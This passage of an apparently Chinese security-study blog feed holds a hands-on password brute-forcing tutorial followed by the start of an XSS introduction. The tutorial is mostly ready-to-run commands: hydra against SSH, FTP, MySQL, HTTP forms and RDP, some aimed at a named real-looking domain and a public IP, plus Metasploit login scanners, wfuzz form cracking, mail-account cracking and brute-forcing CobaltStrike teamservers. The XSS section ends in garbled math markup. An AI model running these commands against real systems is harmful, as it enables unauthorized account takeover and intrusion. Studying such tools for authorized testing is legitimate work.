class="line">OPT</span><br><span class="line">可选项</span><br></pre></td></tr></table></figure><h3 id="使用-hydra-穷举-ssh-服务"><a class="markdownIt-Anchor" href="#使用-hydra-穷举-ssh-服务">#</a> 使用 hydra 穷举 ssh 服务</h3><p>hydra -L users.txt -P password.txt -t 1 -vV -e ns 192.168.1.118 ssh -o ssh.txt -f ssh://192.168.1.118</p><p>hydra -l root -P password.txt -t 1 -vV -e ns 192.168.1.118 ssh -o ssh.txt -f</p><p>hydra -l root -P 2019_top100.txt 192.168.1.118 ssh -vV -f</p><ul><li><ul><li>-L 用户字典文件</li><li>-P 密码字典文件</li></ul></li><li><ul><li>-t 线程数</li><li>-vV 详细信息</li></ul></li><li><ul><li>-e ns 使用空口令 使用指定用户和密码试探</li><li>192.168.1.104 你要穷举的 ip</li></ul></li><li><ul><li>ssh 是服务</li><li>-o 保存文件</li></ul></li><li><ul><li>-f 如果找到马上中断扫描</li></ul></li></ul><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1628353082803-8b22be12-2a2b-4004-b770-b794a44e16da.png" alt="img"></p><h3 id="使用-hydra-穷举-ftp-服务"><a class="markdownIt-Anchor" href="#使用-hydra-穷举-ftp-服务">#</a> 使用 hydra 穷举 ftp 服务</h3><p>hydra -L 用户名字典 -P 密码字典 -t6-e ns IP 地址 -v</p><p>hydra ip ftp -l 用户名 -P 密码字典 -t 线程 (默认 16) -vV</p><p>实例：</p><p>hydra 192.168.1.117 ftp -l admin -P top100password.txt -t30 -vV</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1628353424811-c8e8a429-eaa1-41c5-9b5c-b7ec74fb3c7f.png" alt="img"></p><h3 id="使用-hydra-穷举-mysql-服务"><a class="markdownIt-Anchor" href="#使用-hydra-穷举-mysql-服务">#</a> 使用 hydra 穷举 mysql 服务</h3><p>hydra ip mysql -l 用户名 -P 密码字典 -t 线程 (默认 16) -vV</p><ul><li><ul><li>hydra 192.168.1.117 mysql -l root -P top100password.txt -t 3 -vV</li></ul></li></ul><p>hydra ip mysql -l 用户名 -P 密码字典 -e ns -vV</p><ul><li><ul><li>hydra 192.168.1.117 mysql -l root -P top100password.txt -e ns -vV</li></ul></li></ul><p>hydra ip mysql -l 用户名 -P 密码字典 -e ns -vV -s 端口</p><ul><li><ul><li>hydra 192.168.1.117 mysql -l root -P top100password.txt -e ns -vV -s 3306</li></ul></li></ul><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1628354111007-5fdee3e4-f3d1-4b60-a619-de1052e7f201.png" alt="img"></p><h3 id="使用-hydra-穷举-http-服务"><a class="markdownIt-Anchor" href="#使用-hydra-穷举-http-服务">#</a> 使用 hydra 穷举 http 服务</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">get方式提交，破解web登录：</span><br><span class="line">    hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns ip http-get /admin/ </span><br><span class="line">    hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns -f ip http-get /admin/index.php</span><br><span class="line">//-e ns 支持空密码 </span><br><span class="line">//-f   破解出来一个密码就停止</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">post方式提交，破解web登录：</span><br><span class="line">    hydra -f -l 用户名 -P 密码字典 -V -s 9900 IP地址 http-post-form &quot;/admin/index.php?action=login:user=^USER^&amp;pw=^PASS^&quot;</span><br><span class="line">    hydra -l 用户名 -P 密码字典 -s 80 ip http-post-form &quot;/admin/login.php:username=^USER^&amp;password=^PASS^&amp;submit=login&quot; </span><br><span class="line">// -s 指定非默认端口</span><br><span class="line">// /index.php …这个是登录的 url</span><br><span class="line">// 后门是POST的数据 其中的用户名密码使用 USER PASS 来代替</span><br><span class="line">// 然后是如果登录出错 会出现的字符 。。。然后开始破解</span><br><span class="line"></span><br><span class="line">实例：</span><br><span class="line">    hydra -f -l admin -P /root/pass.txt -V -s 80 www.linghua.com http-post-form &quot;/admin_S/adminlogin.asp:username=^USER^&amp;password=^PASS^&amp;Submit=%B5%C7%C2%BD&amp;action=login:sorry password&quot;  </span><br></pre></td></tr></table></figure><h4 id=""><a class="markdownIt-Anchor" href="#">#</a> </h4><h3 id="使用-hydra-穷举-rdp-服务"><a class="markdownIt-Anchor" href="#使用-hydra-穷举-rdp-服务">#</a> 使用 hydra 穷举 rdp 服务</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hydra -l administrator -P pass.txt -V ip rdp</span><br><span class="line"></span><br><span class="line">实例：</span><br><span class="line">  hydra -l chong -P /root/pass.txt -V 60.191.58.185 rdp</span><br></pre></td></tr></table></figure><h3 id="kali自带字典目录"><a class="markdownIt-Anchor" href="#kali自带字典目录">#</a> kali 自带字典目录</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/wordlists/</span><br></pre></td></tr></table></figure><h1 id="metasploit-穷举模块的使用"><a class="markdownIt-Anchor" href="#metasploit-穷举模块的使用">#</a> metasploit 穷举模块的使用</h1><p>metasploit 是一个渗透测试集成套件 同样也有穷举模块；</p><ul><li><p>auxiliary/scanner/ftp/ftp_login</p></li><li><p>auxiliary/scanner/ssh/ssh_login</p></li><li><p>auxiliary/scanner/telnet/telnet_login</p></li><li><p>auxiliary/scanner/smb/smb_login</p></li><li><p>auxiliary/scanner/mssql/mssql_login</p></li><li><p>auxiliary/scanner/mysql/mysql_login</p></li><li><p>auxiliary/scanner/oracle/oracle_login</p></li><li><p>auxiliary/scanner/postgres/postgres_login</p></li><li><p>auxiliary/scanner/vnc/vnc_login</p></li><li><p>auxiliary/scanner/pcanywhere/pcanywhere_login</p></li><li><p>auxiliary/scanner/snmp/snmp_login</p></li></ul><p>使用：</p><ul><li><p>首先启动在终端下启动 msfconsole；</p></li><li><p>use 使用 ssh_login 模块：</p></li><li><ul><li>use auxiliary/scanner/ssh/ssh_login</li></ul></li><li><p>show options 查看模块的参数；</p></li></ul><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1628354519837-7ed9bc6e-685f-498f-9339-6157651c803f.png" alt="img"></p><ul><li><ul><li>RHOSTS 攻击的目标</li><li>PASS_FILE 密码字典</li></ul></li><li><ul><li>STOP_ON_SUCCESS 成功破解一个终止</li><li>THREADS 线程</li></ul></li><li><ul><li>USERNAME  用户名</li></ul></li><li><p>set 设置参数：</p></li><li><ul><li>set RHOSTS 192.168.1.118</li><li>set PASS_FILE /home/kali/Desktop/top100password.txt</li></ul></li><li><ul><li>set STOP_ON_SUCCESS true</li><li>set USERNAME root</li></ul></li></ul><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1628354858798-af09949e-2bd0-4b85-8e32-e9f3e1a48421.png" alt="img"></p><ul><li>设置好后用 run 或者 exploit  攻击；</li></ul><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1628354936465-26804b50-38b8-4070-82f8-b500d70dcee0.png" alt="img"></p><h1 id="御剑-rdp-爆破工具的使用"><a class="markdownIt-Anchor" href="#御剑-rdp-爆破工具的使用">#</a> 御剑 RDP 爆破工具的使用</h1><p><span class="exturl" data-url="aHR0cHM6Ly93YXJzZWMueXVxdWUuY29tL2F0dGFjaG1lbnRzL3l1cXVlLzAvMjAyMS96aXAvMjk0MjIyNi8xNjQwNzYxMTQ1NjQ1LTU0ZGFjY2VjLTE0MTEtNDVhZS1iMzBjLTYwYWNjN2Q2NDFkOC56aXA=">📎御剑 RDP 爆破工具.zip</span></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1628356259226-facf9feb-1998-41b1-8ae5-0cae84fa054b.png" alt="img"></p><h1 id="wfuzz-多线程穷举密码"><a class="markdownIt-Anchor" href="#wfuzz-多线程穷举密码">#</a> wfuzz 多线程穷举密码</h1><p>Wfuzz 是一款为了评估 WEB 应用而生的 Fuzz（Fuzz 是爆破的一种手段）工具，它基于一个简单的理念，即用给定的 Payload 去 fuzz。它允许在 HTTP 请求里注入任何输入的值，针对不同的 WEB 应用组件进行多种复杂的爆破攻击。比如：参数、认证、表单、目录 / 文件、头部等等，这款工具在 kali 里面自带；</p><p>可以用 Wfuzz 找到下面的漏洞：</p><ul><li><p>可预测的认证</p></li><li><p>可预测的 session 标志（session id）</p></li><li><p>可预测的资源定位（目录和文件）</p></li><li><p>注入</p></li><li><p>路径遍历</p></li><li><p>溢出</p></li><li><p>跨站脚本</p></li><li><p>认证漏洞</p></li><li><p>不安全的直接对象引用</p></li><li><p>………</p></li></ul><h3 id="常用参数"><a class="markdownIt-Anchor" href="#常用参数">#</a> 常用参数：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">Usage:    wfuzz [options] -z payload,params &lt;url&gt;</span><br><span class="line">    FUZZ, ..., FUZnZ              payload占位符，wfuzz会用指定的payload代替相应的占位符，n代表数字.</span><br><span class="line">    FUZZ&#123;baseline_value&#125;     FUZZ 会被 baseline_value替换，并将此作为测试过程中第一个请求来测试，可用来作为过滤的一个基础。</span><br><span class="line">Options:</span><br><span class="line">    -h/--help            : 帮助文档</span><br><span class="line">    --help                : 高级帮助文档</span><br><span class="line">    --version            : Wfuzz详细版本信息</span><br><span class="line">    -e &lt;type&gt;            :  显示可用的encoders/payloads/iterators/printers/scripts列表</span><br><span class="line">    --recipe &lt;filename&gt;        : 从文件中读取参数</span><br><span class="line">    --dump-recipe &lt;filename&gt;    : 打印当前的参数并保存成文档</span><br><span class="line">    --oF &lt;filename&gt;               : 将测试结果保存到文件，这些结果可被wfuzz payload 处理</span><br><span class="line">    -c                : 彩色化输出</span><br><span class="line">    -v                : 详细输出</span><br><span class="line">    -f filename,printer         : 将结果以printer的方式保存到filename (默认为raw printer).</span><br><span class="line">    -o printer                  : 输出特定printer的输出结果</span><br><span class="line">    --interact            : (测试功能) 如果启用，所有的按键将会被捕获，这使得你能够与程序交互</span><br><span class="line">    --dry-run            : 打印测试结果，而并不发送HTTP请求</span><br><span class="line">    --prev                : 打印之前的HTTP请求（仅当使用payloads来生成测试结果时使用）</span><br><span class="line">    -p addr                : 使用代理，格式 ip:port:type. 可设置多个代理，type可取的值为SOCKS4,SOCKS5 or HTTP（默认）</span><br><span class="line">    -t N                : 指定连接的并发数，默认为10</span><br><span class="line">    -s N                : 指定请求的间隔时间，默认为0</span><br><span class="line">    -R depth            : 递归路径探测，depth指定最大递归数量</span><br><span class="line">    -L,--follow            : 跟随HTTP重定向</span><br><span class="line">    -Z                : 扫描模式 (连接错误将被忽视).</span><br><span class="line">    --req-delay N            : 设置发送请求允许的最大时间，默认为 90，单位为秒.</span><br><span class="line">    --conn-delay N              : 设置连接等待的最大时间，默认为 90，单位为秒.</span><br><span class="line">    -A                : 是 --script=default -v -c 的简写</span><br><span class="line">    --script=            : 与 --script=default 等价</span><br><span class="line">    --script=&lt;plugins&gt;        : 进行脚本扫描， &lt;plugins&gt; 是一个以逗号分开的插件或插件分类列表</span><br><span class="line">    --script-help=&lt;plugins&gt;        : 显示脚本的帮助</span><br><span class="line">    --script-args n1=v1,...     : 给脚本传递参数. ie. --script-args grep.regex=&quot;&lt;A href=\&quot;(.*?)\&quot;&gt;&quot;</span><br><span class="line">    -u url                      : 指定请求的URL</span><br><span class="line">    -m iterator            : 指定一个处理payloads的迭代器 (默认为product)</span><br><span class="line">    -z payload            : 为每一个占位符指定一个payload，格式为 name[,parameter][,encoder].</span><br><span class="line">                      编码可以是一个列表, 如 md5-sha1. 还可以串联起来, 如. md5@sha1.</span><br><span class="line">                      还可使用编码各类名，如 url</span><br><span class="line">                                      使用help作为payload来显示payload的详细帮助信息，还可使用--slice进行过滤</span><br><span class="line">    --zP &lt;params&gt;            : 给指定的payload设置参数。必须跟在 -z 或-w 参数后面</span><br><span class="line">    --slice &lt;filter&gt;        : 以指定的表达式过滤payload的信息，必须跟在-z 参数后面</span><br><span class="line">    -w wordlist            : 指定一个wordlist文件，等同于 -z file,wordlist</span><br><span class="line">    -V alltype            : 暴力测试所有GET/POST参数，无需指定占位符</span><br><span class="line">    -X method            : 指定一个发送请求的HTTP方法，如HEAD或FUZZ</span><br><span class="line">    -b cookie            : 指定请求的cookie参数，可指定多个cookie</span><br><span class="line">    -d postdata             : 设置用于测试的POST data (ex: &quot;id=FUZZ&amp;catalogue=1&quot;)</span><br><span class="line">    -H header              : 设置用于测试请求的HEADER (ex:&quot;Cookie:id=1312321&amp;user=FUZZ&quot;). 可指定多个HEADER.</span><br><span class="line">    --basic/ntlm/digest auth    : 格式为 &quot;user:pass&quot; or &quot;FUZZ:FUZZ&quot; or &quot;domain\FUZ2Z:FUZZ&quot;</span><br><span class="line">    --hc/hl/hw/hh N[,N]+        : 以指定的返回码/行数/字数/字符数作为判断条件隐藏返回结果 (用 BBB 来接收 baseline)</span><br><span class="line">    --sc/sl/sw/sh N[,N]+        : 以指定的返回码/行数/字数/字符数作为判断条件显示返回结果 (用 BBB 来接收 baseline)</span><br><span class="line">    --ss/hs regex            : 显示或隐藏返回结果中符合指定正则表达式的返回结果</span><br><span class="line">    --filter &lt;filter&gt;        : 显示或隐藏符合指定filter表达式的返回结果 (用 BBB 来接收 baseline)</span><br><span class="line">    --prefilter &lt;filter&gt;        : 用指定的filter表达式在测试之前过滤某些测试</span><br></pre></td></tr></table></figure><h3 id="使用实例"><a class="markdownIt-Anchor" href="#使用实例">#</a> 使用实例：</h3><p>GET 类型爆破：</p><ul><li><ul><li>wfuzz -c -z file,users.txt -z file,pass.txt --sc 200 <span class="exturl" data-url="aHR0cDovL3d3dy5zaXRlLmNvbS9sb2cuYXNwP3VzZXI9RlVaWiZhbXA7cGFzcz1GVVoyWg==">http://www.site.com/log.asp?user=FUZZ&amp;pass=FUZ2Z</span></li><li>注意，多个参数，就用多个占位符，比如：FUZZ,FUZ2Z,FUZ3Z,FUZnZ；</li></ul></li></ul><p>POST 类型爆破：</p><ul><li><ul><li>wfuzz -c -z file,2019_top100.txt --sc 302 -u <span class="exturl" data-url="aHR0cDovL3d3dy5jMW1vb24uY29tL2FkbWluL2luZGV4LnBocD9hY3Rpb249bG9naW4=">http://www.c1moon.com/admin/index.php?action=login</span> -d “user=admin&amp;pw=FUZZ”</li></ul></li></ul><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1628358146427-3f06d96d-7eff-4400-be3c-e6ff6b620ac9.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1628358220411-a5f2ad9f-d271-4cac-a985-6afaf4bf253d.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1628358236235-24621f50-afd8-46ad-b798-18c4274eaa95.png" alt="img"></p><p>另外两种方式：</p><ul><li><ul><li>wfuzz -c -z file,top100password.txt --hc 404 --hh 1549 -u <span class="exturl" data-url="aHR0cDovL3d3dy5jMW1vb24uY29tL2FkbWluL2luZGV4LnBocD9hY3Rpb249bG9naW4=">http://www.c1moon.com/admin/index.php?action=login</span> -d “user=admin&amp;pw=FUZZ”</li></ul></li><li><ul><li><ul><li>排除，我们都知道，登陆成功的话很多网站都会是 302 跳转，那我们可以通过–hc 参数排除 404 的状态码，–hh 排除 1549 的长度包；</li></ul></li></ul></li><li><ul><li>wfuzz -c -w /home/kali/csdnpass.txt --hc 404 --hh 1549 -u <span class="exturl" data-url="aHR0cDovL3d3dy5jMW1vb24uY29tL2FkbWluL2luZGV4LnBocD9hY3Rpb249bG9naW4=">http://www.c1moon.com/admin/index.php?action=login</span> -d “user=admin&amp;pw=FUZZ”</li></ul></li><li><ul><li><ul><li>同上排除，只不过是加载密码文件方式不一样了，直接使用 - w 参数加载密码文件；</li></ul></li></ul></li></ul><h1 id="邮箱密码的穷举"><a class="markdownIt-Anchor" href="#邮箱密码的穷举">#</a> 邮箱密码的穷举</h1><p>以 qq 邮箱为例：</p><ul><li><ul><li>POP3/SMTP 协议：<br>收发邮件服务器地址分别如下：<br>接收邮件服务器：<span class="exturl" data-url="aHR0cDovL3BvcC5leG1haWwucXEuY29t">pop.exmail.qq.com</span> (端口 110)<br> 发送邮件服务器：<span class="exturl" data-url="aHR0cDovL3NtdHAuZXhtYWlsLnFxLmNvbQ==">smtp.exmail.qq.com</span> (端口 25)<br> 同时支持 SSL 加密方式登录，此时需要更改一下端口号：<br>接收服务器端口：995<br> 发送服务器端口：465</li></ul></li></ul><h2 id="企业独立搭建的邮服-用-mailcracker-进行破解"><a class="markdownIt-Anchor" href="#企业独立搭建的邮服-用-mailcracker-进行破解">#</a> 企业独立搭建的邮服 用 MailCracker 进行破解</h2><p><span class="exturl" data-url="aHR0cHM6Ly93YXJzZWMueXVxdWUuY29tL2F0dGFjaG1lbnRzL3l1cXVlLzAvMjAyMS9yYXIvMjk0MjIyNi8xNjQwNzYxMTQ1ODMxLTFiNDgwMWUyLTNmMjktNDUyNy04MGFlLTk1NWIzNDdjZGVhYS5yYXI=">📎MailCracker_Trial_CN.rar</span></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1628359979627-4e968d80-6668-4db0-94e6-9d98246f6eef.png" alt="img"></p><p>爆破出来可以使用 foxmail 这个工具进行连接；</p><p>地址：<span class="exturl" data-url="aHR0cHM6Ly93d3cuZm94bWFpbC5jb20v">https://www.foxmail.com/</span></p><h1 id="cobaltstrike-teamserver-口令暴力破解"><a class="markdownIt-Anchor" href="#cobaltstrike-teamserver-口令暴力破解">#</a> CobaltStrike TeamServer 口令暴力破解</h1><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1628360367338-b43d6c51-0f46-460f-8da4-146c419b08f3.png" alt="img"></p><p>Cobalt Strike 是一款超级好用的渗透测试工具，拥有多种协议主机上线方式，集 成了提权，凭据导出，端口转发，socket 代理，office 攻击，文件捆绑，钓鱼等 多种功能。同时，Cobalt Strike 还可以调用 Mimikatz 等其他知名工具，因此广受 技术大佬的喜爱。Cobalt Strike 是一款超级好用的渗透测试工具，拥有多种协议 主机上线方式，集成了提权，凭据导出，端口转发，socket 代理，office 攻击， 文件捆绑，钓鱼等多种功能。同时，Cobalt Strike 还可以调用 Mimikatz 等其他知 名工具，因此广受技术大佬的喜爱；</p><p>Cobalt Strike 是由美国 Red Team 开发；</p><p>官网地址： <span class="exturl" data-url="aHR0cDovL2NvYmFsdHN0cmlrZS5jb20=">http://cobaltstrike.com</span></p><p>这个工具的社区版是大家熟知的 Armitage (一个 MSF 的图形化界面工具)，而 Cobalt Strike 大家可以理解其为 Armitage 的商业版；</p><p>TeamServer 口令暴力破解 然而今天我们并不是介绍和讲解 Cobalt Strike，而是关于 Cobalt Strike 的口令暴 力破解，众所周知 Cobalt Strike 的工作方式是以 TeamServer 为核心，可多个 Cilent 的 CS（Server Cilent）架构；</p><p>启动 teamserver</p><p>sudo ./teamserver 192.168.0.102 123456</p><p>启动 temaerver 之后可以通过客户端连接连接服务器 默认的端口是 50050 密码 是 123456 即可登录；</p><p>如果把 teamserver 放在公网上，口令设置薄弱 可以通过对其穷举有一定的几率 获取 teamserver 的权限，那么服务器里的被成功控制的机器，我们也可以对其 控制。所以说危害是非常大的；</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1628361085248-d92a5b1e-6f90-49fd-b7eb-10ece8f62d0a.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1628361093516-de9028b6-3285-478d-ad91-fa5286305fd7.png" alt="img"></p><p>使用 <span class="exturl" data-url="aHR0cDovL2NzYnVzdGVyLnB5">csbuster.py</span> 对 50050 端口进行密码穷举：</p><p>工具：<span class="exturl" data-url="aHR0cHM6Ly93YXJzZWMueXVxdWUuY29tL2F0dGFjaG1lbnRzL3l1cXVlLzAvMjAyMS9weS8yOTQyMjI2LzE2NDA3NjExNDU5OTktODkyYWQyNWYtOTViZS00Y2MyLTlhMGQtMzUyYmM0NGNiMzM3LnB5">📎csbuster.py</span></p><p>使用方法：python3 <span class="exturl" data-url="aHR0cDovL2NzYnVzdGVyLnB5">csbuster.py</span> 192.168.0.102 /home/kali/top1000.txt -t 5</p><ul><li><ul><li><ul><li>-p   指定端口，默认 50050</li></ul></li></ul></li></ul><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1628361214646-9bb3e0cf-a2c0-4814-9c88-3efcafa03859.png" alt="img"></p><h1 id="对-apache-tomcat-服务进行穷举"><a class="markdownIt-Anchor" href="#对-apache-tomcat-服务进行穷举">#</a> 对 apache-tomcat  服务进行穷举</h1><p>Apache Tomcat 是世界上使用最广泛的 Java Web 应用服务器之一，绝大数人都会 使用 Tomcat 的默认配置。然而默认配置中会有一个向外网开放的 Web 应用管理 器，管理员可以利用它在服务器中启动、停止、添加和删除应用；</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1628361324716-f3d4a86e-9575-4c6f-8d53-5d6d6ed42f0a.png" alt="img"></p><p>msf 利用：</p><ul><li><ul><li>use scanner/http/tomcat_mgr_login</li><li>set PASSWORD    设置密码字典</li></ul></li><li><ul><li>set RPORT 8081     设置端口</li><li>set RHOSTS 192.168.52.6</li></ul></li><li><ul><li>exploit     攻击</li></ul></li></ul><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1628361399728-2ab1e1ee-bef1-43b6-8011-4bdcc1a4a692.png" alt="img"></p><h1 id="超级弱口令穷举使用"><a class="markdownIt-Anchor" href="#超级弱口令穷举使用">#</a> 超级弱口令穷举使用</h1><p>地址：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3NoYWNrMi9TTkVUQ3JhY2tlcg==">https://github.com/shack2/SNETCracker</span></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1628361992414-3d1fb30e-832b-452f-ba11-1cacf582778c.png" alt="img"></p><p>若有收获，就点个赞吧</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;第一天穷举&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#第一天穷举&quot;&gt;#&lt;/a&gt; 第一天：穷举&lt;/h1&gt;
&lt;h1 id=&quot;概述&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#概述&quot;&gt;#&lt;/a&gt; 概述&lt;/h1</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://sun-spots.github.io/2022/03/02/%E4%BF%AE%E6%94%B9/XSS%E6%BC%8F%E6%B4%9E/"/>
    <id>https://sun-spots.github.io/2022/03/02/%E4%BF%AE%E6%94%B9/XSS%E6%BC%8F%E6%B4%9E/</id>
    <published>2022-03-02T01:25:28.405Z</published>
    <updated>2022-03-02T02:03:48.918Z</updated>
    
    <content type="html"><![CDATA[<h1 id="xss-漏洞介绍"><a class="markdownIt-Anchor" href="#xss-漏洞介绍">#</a> xss 漏洞介绍</h1><p>XSS 攻击全称跨站脚本攻击，系统将用户输入的值当作为 html 的语句进行执行，从而产生 XSS 攻击，是为不和层叠样式表 (Cascading Style Sheets, CSS) 的缩写混淆，故将跨站脚本攻击缩写为 XSS，XSS 是一种在 web 应用中的计算机安全漏洞，它允许恶意 web 用户将代码植入到 web 网站里面，供给其它用户访问，当用户访问到有恶意代码的网页就会产生 xss 攻击；</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1628762504451-52222a74-130f-4039-af4b-924ff5c32373.png" alt="img"></p><h1 id="xss-攻击的危害包括"><a class="markdownIt-Anchor" href="#xss-攻击的危害包括">#</a> XSS 攻击的危害包括</h1><p>1、盗取各类用户帐号，如机器登录帐号、用户网银帐号、各类管理员帐号；</p><p>2、控制企业数据，包括读取、篡改、添加、删除企业敏感数据的能力 ；</p><p>3、盗窃企业重要的具有商业价值的资料 ；</p><p>4、非法转账 ；</p><p>5、强制发送电子邮件 ；</p><p>6、网站挂马 ；</p><p>7、控制受害者机器向其它网站发起攻击  ；</p><h1 id="xss-防御"><a class="markdownIt-Anchor" href="#xss-防御">#</a> XSS 防御</h1><p>XSS 防御的总体思路是：对输入 (和 URL 参数) 进行过滤，对输出进行编码，也就是对提交的所有内容进行过滤，对 url 中的参数进行过滤，过滤掉会导致脚本执行的相关内容；然后对动态输出到页面的内容进行 html 编码，使脚本无法在浏览器中执行；</p><h1 id="xss-漏洞的类型"><a class="markdownIt-Anchor" href="#xss-漏洞的类型">#</a> xss 漏洞的类型</h1><h2 id="反射型-xss"><a class="markdownIt-Anchor" href="#反射型-xss">#</a> 反射型 XSS</h2><pre><code>反射型 XSS，非持久化，需要欺骗用户自己去点击链接才能触发 XSS 代码，反射型 xss 攻击的方法，攻击者通过发送邮件或诱导等方法，将包含有 xss 恶意链接发送给目标用户，当目标用户访问该链接时，服务器将接收该用户的请求并进行处理，然后服务器把带有 xss 恶意脚本发送给目标用户的浏览器，浏览器解析这段带有 xss 代码的恶意脚本后，就会触发 xss 攻击；  </code></pre><p>反 射 型 xss s<br> 特 点 ． 仅 执 行 一 次 ， 非 持 久 型 ， 参 数 型 跨 站 脚 本・<br>主 要 存 在 于 攻 击 者 将 恶 意 脚 本 附 加 到 丽 的 参 数 中 ， 发 送 给 受 害 者 ， 服 务 端 未 经 严 格 过 滤 处 理而输出在用户浏览器中，导 致 浏 览 器 执 行 代 码 数 据 。</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1628762821870-fbec1062-da3e-491c-b614-ee9bafb3eb47.png" alt="img"></p><h4 id="代码分析"><a class="markdownIt-Anchor" href="#代码分析">#</a> 代码分析</h4><p>在反射型 xss 代码中，首先判断<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mrow></mrow><mi>G</mi></msub><mi>E</mi><mi>T</mi><msup><mo stretchy="false">[</mo><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mi>m</mi><mi>s</mi><mi>s</mi><mi>a</mi><mi>g</mi><msup><mi>e</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo stretchy="false">]</mo><mtext>是否等于</mtext><mi>k</mi><mi>o</mi><mi>b</mi><mi>e</mi><mtext>，如果不是则在页面中将</mtext></mrow><annotation encoding="application/x-tex">_GET[&#x27;mssage&#x27;]是否等于 kobe，如果不是则在页面中将</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.001892em;vertical-align:-0.25em;"></span><span class="mord"><span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">G</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mopen"><span class="mopen">[</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mord mathnormal">m</span><span class="mord mathnormal">s</span><span class="mord mathnormal">s</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mclose">]</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">否</span><span class="mord cjk_fallback">等</span><span class="mord cjk_fallback">于</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal">o</span><span class="mord mathnormal">b</span><span 